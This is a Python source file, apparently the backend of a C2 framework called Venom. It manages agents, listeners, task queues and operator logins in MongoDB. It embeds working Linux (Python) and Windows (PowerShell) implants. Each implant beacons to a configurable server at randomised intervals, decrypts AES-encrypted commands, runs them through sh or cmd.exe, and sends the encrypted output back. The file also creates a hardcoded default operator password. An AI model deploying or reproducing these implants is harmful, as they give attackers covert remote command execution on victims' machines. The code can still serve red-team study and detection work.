from pymongo import MongoClient
from hashlib import sha256

client = MongoClient('mongodb://localhost:27017/')
db = client.C2

''' 
To-Do: 
1- Handle bad requested tasks (bad commands)
2- Delete the task after writing its result
'''

def registerAgent(agentID, type, bindListenerID, ip, port, timeout=86400):

    agent = {'id': agentID, 
             'port': port,
             'type': type,
             'status': 'dead',
             'task': '',
             'taskResult': '',
             'bindListenerID': bindListenerID,
             'serverIP': ip, 
             'timeout': timeout
             }

    db.agents.insert_one(agent)


def deleteAgent(agentID):
    db.agents.delete_one({'id': {'$eq': agentID}})


def saveListener(listenerId, port, key):
    listener = {'id': listenerId,
                'port': port,
                'key': key}
    db.listeners.insert_one(listener)


def getListener(id):
    return db.listeners.find_one({'id': {'$eq': id}})


def getListeners():
    return db.listeners.find()


def delListener(id):

    if(db.listeners.find_one({'id': {'$eq': id}})):
        db.listeners.delete_one({'id': {'$eq': id}})
        return True
    else:
        return False

def checkTask(agentID):
    task = db.agents.find_one({'id': {'$eq': agentID}}).get('task')

    if (task):
        return task

    else:
        return 


def clearTask(agentID):
    db.agents.update_one({
        'id': agentID
    }, {
        '$set': {
            'task': ''
        }
    })


def assignTask(agentID, task):

    db.agents.update_one({
        'id': agentID
    }, {
        '$set': {
            'task': task
        }
    })


def writeResult(agentID, result):
    db.agents.update_one({
        'id': agentID},
        {
        '$set': {
            'taskResult': result
        }
    })


def getKey(id):
    return db.listeners.find_one({
        'id': {
            '$eq': id}
    }).get('key')


def checkListenerPort(port):
    return db.listeners.find_one({
        'port': {
            '$eq': port}
    })

def getAgentListener(agentID):
    return db.agents.find_one({
        'id': {
            '$eq': agentID}
    }).get('bindListenerID')

def getAgents():
    return db.agents.find()

def login(email, password): 
    if db.operators.find_one({'email': {'$eq': email}, 'password': {'$eq': sha256(password.encode('utf-8')).hexdigest()}}): 
        return True
    else: 
        return False    

def getImplant(type): 
    return db.implants.find_one({'type': {'$eq' : type }}).get('implant')

implant_linux = '''import requests as r 
from base64 import b64encode, b64decode 
from random import seed
from random import randint
from time import sleep
import os
#encryption libraries
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

_IP_ = 'REPLACE_IP'
_PORT_ = 'REPLACE_PORT'
_ID_ = 'REPLACE_ID' 
_KEY_ = 'REPLACE_KEY'


#add encrytion and decryption FCNs
def encrypt(task):
    base64_bytes = _KEY_.encode("ascii")
    key = b64decode(base64_bytes)
    IV = os.urandom(16)
    c = AES.new(key, AES.MODE_CBC, IV)
    ct = IV + c.encrypt(pad(bytes(task, 'utf-8'),AES.block_size))
    base64_bytes = b64encode(ct)
    cipher = base64_bytes.decode("ascii")
    return cipher


def decrypt(eresult):
    base64_bytes = _KEY_.encode("ascii")
    key = b64decode(base64_bytes)
    base64_bytes = eresult.encode("ascii")
    result = b64decode(base64_bytes)
    IV = result[:AES.block_size]
    cipher = AES.new(key, AES.MODE_CBC, IV)
    pt = cipher.decrypt(result[AES.block_size:])
    pt = unpad(pt,16).decode('utf-8')
    return pt
    

if __name__ == "__main__": 

    _C2_ = "http://{}:{}".format(_IP_,_PORT_)    
    #Start Registration 
    while (True): 
        seed()
        sleep(randint(0,20)) 
        response = r.get(url= _C2_ + "/reg/{}".format(_ID_)) 
        
        if ("Success" in response.text): 
            break 
        
        else: 
            continue 
    
    #Start Beaconing 
    while (True): 
        seed()
        sleep(randint(0,20)) 
        task = r.get(url= _C2_ + "/task/{}".format(_ID_)) 
        #add aliases for reverse shell and purging  
        if (task.text): 
            #decrypting data bfore executing command
            cmd = decrypt(task.text)
            result = encrypt(os.popen('echo "{}" | sh'.format(cmd)).read())
            if (result == ''): 
                result = encrypt("Task completed but has no output")
            
            r.post(url= _C2_ + '/task/results/{}'.format(_ID_), data = result.encode('ascii')) 
         
        else: 
            continue'''


implant_windows = '''function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 128
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $aesManaged.Dispose()
    [System.Convert]::ToBase64String($fullData)
}

function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
    
}
function Convert-ASCII($ascii) {
	$letter = @()
	foreach ($char in $ascii){
	$char = [int[]]$char
	$letter += [char[]]$char
	}
	$final = ("$letter").Replace(" ","")
	Return $final
}

$ip = "REPLACE_IP"
$port = "REPLACE_PORT"
$id = "REPLACE_ID"
$key = "REPLACE_KEY"
$reguri = ("http" + ':' + "//$ip" + ':' + "$port/reg/$id")
$name = (Invoke-WebRequest -UseBasicParsing -Uri $reguri -Method 'GET').Content
$name=Convert-ASCII($name)
$name
if ($name -eq "Success"){
$taskuri = ("http" + ':' + "//$ip" + ':' + "$port/task/$id")
$responseuri = ("http" + ':' + "//$ip" + ':' + "$port/task/results/$id")
for (;;) {
$n  = Get-Random -Maximum 20
$task = (Invoke-WebRequest -UseBasicParsing -Uri $taskuri  -Method 'GET').Content
$task=Convert-ASCII($task)
if ($task -ne "0") {

$dtask = Decrypt-String $key $task
$res = cmd.exe /c $dtask
$data = Encrypt-String $key $res
$data = "$data"
$response = (Invoke-WebRequest -UseBasicParsing -Uri $responseuri -body $data -Method 'POST').Content
    }
sleep $n
} }'''

def migrate(): 
    if not db.operators.find_one({'email': {'$eq': 'venom@venom.local'}, 'password': {'$eq': sha256('venom1234'.encode('utf-8')).hexdigest()}}): 
        print("Creating a default password! 😍 ... Make sure to change it\nUsername: venom \nPassword: venom1234")
        db.operators.insert_one({ 
            'email': 'venom@venom.local', 
            'password': sha256('venom1234'.encode('utf-8')).hexdigest()
        }) 
    if not db.implants.find_one({'type': 'Linux' }):
        db.implants.insert_one({'implant': implant_linux, 'type': 'Linux'}) 
    if not db.implants.find_one({'type': 'Windows' }):
        db.implants.insert_one({'implant': implant_windows, 'type': 'Windows'})
